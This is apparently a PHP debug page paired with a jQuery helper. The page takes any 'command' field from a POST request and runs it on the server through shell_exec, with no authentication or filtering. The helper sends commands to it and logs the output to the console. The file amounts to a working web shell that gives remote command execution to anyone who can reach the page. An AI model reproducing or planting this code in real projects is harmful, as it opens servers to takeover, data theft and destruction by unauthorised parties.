<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
  echo shell_exec("export PATH=$PATH:~/git-2.9.5 && ".$_POST['command']);
  return;
}
?>
<script src="assets/js/required/1_jquery.min.js"></script>
<script>
  function execute(command){
    $.ajax({
      type: 'POST',
      url: 'debug.php',
      data: "command="+command,
      success: function(response) {
        console.log(response);
        return true;
      }
    });
    return "Command Executed:";
  }
</script>